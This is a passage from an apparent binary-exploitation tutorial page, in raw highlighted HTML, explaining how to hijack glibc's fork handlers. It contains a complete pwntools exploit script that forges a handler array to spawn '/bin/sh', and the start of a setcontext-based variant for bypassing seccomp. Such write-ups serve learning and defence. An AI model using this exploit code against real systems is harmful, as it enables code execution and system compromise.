class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">fork</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre></div></div>
<p>To demonstrate this, we&#x27;ll use the <del>very realistic application</del> attack scenario above, where we have a libc leak, an arbitrary write, and a call to <code>fork</code> we want to hijack.</p>
<p>We can start by writing some basic methods to create the structures:</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">header</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">addr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> size</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> flat</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> size</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token comment" style="color:#999988;font-style:italic"># we don&#x27;t need to control allocated</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token number" style="color:#36acaa">0x10</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> addr</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">handler_array</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">*</span><span class="token plain">funcs</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">assert</span><span class="token plain"> funcs</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    data </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token builtin">bytearray</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x20</span><span class="token operator" style="color:#393A34">*</span><span class="token builtin">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">funcs</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x18</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> i</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> func </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token builtin">zip</span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">range</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token builtin">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">data</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x20</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> funcs</span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">:</span><span class="token punctuation" style="color:#393A34">:</span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        data</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain">i</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">8</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">func</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> data</span><br></span></code></pre></div></div>
<p>So we can use <code>handler_array(libc.sym.system)</code> to craft an array that will execute <code>system</code>, but we now need to control <code>rdi</code>. We can do this by setting <code>used</code> to some pointer to <code>/bin/sh</code>. However if we use a regular address to point to the handler array, then the large <code>used</code> field will cause it to access invalid memory, as it will access the last handler. So if we need <code>used</code> to be an address, why don&#x27;t we just alter the address of the handler array. As long as</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">fork_handlers</span><span class="token operator" style="color:#393A34">-&gt;</span><span class="token plain">array</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">fork_handlers</span><span class="token operator" style="color:#393A34">-&gt;</span><span class="token plain">used</span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">]</span><br></span></code></pre></div></div>
<p>points to our handler, then it&#x27;ll work. We can forge such an address as follows:</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">addr </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">addr </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">size</span><span class="token operator" style="color:#393A34">-</span><span class="token builtin">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">funcs</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">*</span><span class="token number" style="color:#36acaa">0x20</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">%</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">1</span><span class="token operator" style="color:#393A34">&lt;&lt;</span><span class="token number" style="color:#36acaa">64</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<p>Of course this will create an &quot;address&quot; that&#x27;s complete nonsense, but that doesn&#x27;t matter, as it won&#x27;t access the start of the array (unless <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/posix/register-atfork.c#L34" target="_blank" rel="noopener noreferrer">__register_atfork</a> or <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/posix/register-atfork.c#L75" target="_blank" rel="noopener noreferrer">__unregister_atfork</a> is used). Putting this all together, we can arrive at the following exploit:</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">#!/usr/bin/python3</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> pwn </span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">e </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> context</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">binary </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> ELF</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;vuln&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">libc </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> ELF</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;libc&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> checksec</span><span class="token operator" style="color:#393A34">=</span><span class="token boolean" style="color:#36acaa">False</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> e</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">process</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">fgets </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token builtin">int</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">recvline</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">16</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">log</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">info</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string-interpolation string" style="color:#e3116c">f&quot;fgets: </span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation builtin">hex</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">(</span><span class="token string-interpolation interpolation">fgets</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">)</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">libc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">address </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> fgets </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> libc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sym</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">fgets</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">log</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">info</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string-interpolation string" style="color:#e3116c">f&quot;libc: </span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation builtin">hex</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">(</span><span class="token string-interpolation interpolation">libc</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">.</span><span class="token string-interpolation interpolation">address</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">)</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">header</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">addr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> size</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> flat</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> size</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token number" style="color:#36acaa">0x10</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> addr</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">handler_array</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">*</span><span class="token plain">funcs</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">assert</span><span class="token plain"> funcs</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    data </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token builtin">bytearray</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x20</span><span class="token operator" style="color:#393A34">*</span><span class="token builtin">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">funcs</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x18</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> i</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> func </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token builtin">zip</span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">range</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token builtin">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">data</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x20</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> funcs</span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">:</span><span class="token punctuation" style="color:#393A34">:</span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        data</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain">i</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">8</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">func</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> data</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">forge_split</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">addr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">funcs</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> rdi</span><span class="token operator" style="color:#393A34">=</span><span class="token boolean" style="color:#36acaa">None</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    array </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> handler_array</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">*</span><span class="token plain">funcs</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> rdi </span><span class="token keyword" style="color:#00009f">is</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">not</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">None</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        size </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> rdi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">assert</span><span class="token plain"> size </span><span class="token operator" style="color:#393A34">&gt;=</span><span class="token plain"> </span><span class="token builtin">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">funcs</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        addr </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">addr </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">size</span><span class="token operator" style="color:#393A34">-</span><span class="token builtin">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">funcs</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">*</span><span class="token number" style="color:#36acaa">0x20</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">%</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">1</span><span class="token operator" style="color:#393A34">&lt;&lt;</span><span class="token number" style="color:#36acaa">64</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">else</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        size </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token builtin">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">funcs</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> header</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">addr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> size</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> array</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">forge</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">addr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">funcs</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> rdi</span><span class="token operator" style="color:#393A34">=</span><span class="token boolean" style="color:#36acaa">None</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    hdr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> arr </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> forge_split</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">addr</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">0x18</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">funcs</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> rdi</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">rdi</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> hdr </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> arr</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">addr </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> libc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sym</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">fork_handlers</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">data </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> forge</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">addr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> libc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sym</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">system</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> rdi</span><span class="token operator" style="color:#393A34">=</span><span class="token builtin">next</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">libc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">search</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">b&quot;/bin/sh\x00&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">assert</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;\n&quot;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">not</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> data</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sendlineafter</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">b&quot;Enter address, size and data: &quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string-interpolation string" style="color:#e3116c">f&quot;</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">addr</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c"> </span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation builtin">len</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">(</span><span class="token string-interpolation interpolation">data</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">)</span><span class="token string-interpolation interpolation operator" style="color:#393A34">+</span><span class="token string-interpolation interpolation number" style="color:#36acaa">2</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c"> &quot;</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">encode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> data</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">interactive</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="is-that-all-we-can-do">Is that all we can do?<a href="#is-that-all-we-can-do" class="hash-link" aria-label="Direct link to Is that all we can do?" title="Direct link to Is that all we can do?">​</a></h3>
<p>This is the basic payload, but we can do more than just this. Take for example, a case where seccomp is in place, and we don&#x27;t have access to <code>execve</code>, meaning calling <code>system</code> is useless now! Is that all we can do with a function call with a controlled argument? <del>Yes, thanks for reading.</del></p>
<p>This is where <code>setcontext</code> comes in! I covered this already <a href="/pwn/pwn/setcontext">here</a>, but basically this allows us to get ROP through the use of a function resembling the <code>sigreturn</code> syscall. We can substitute this in as follows:</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">setcontext</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">regs</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> addr</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	frame </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> SigreturnFrame</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> reg</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> val </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> regs</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">items</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		</span><span class="token builtin">setattr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">frame</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> reg</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> val</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token comment" style="color:#999988;font-style:italic"># needed to prevent SEGFAULT</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token builtin">setattr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">frame</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;&amp;fpstate&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> addr</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">0x1a8</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	fpstate </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> p16</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x37f</span><span class="token punctuation" 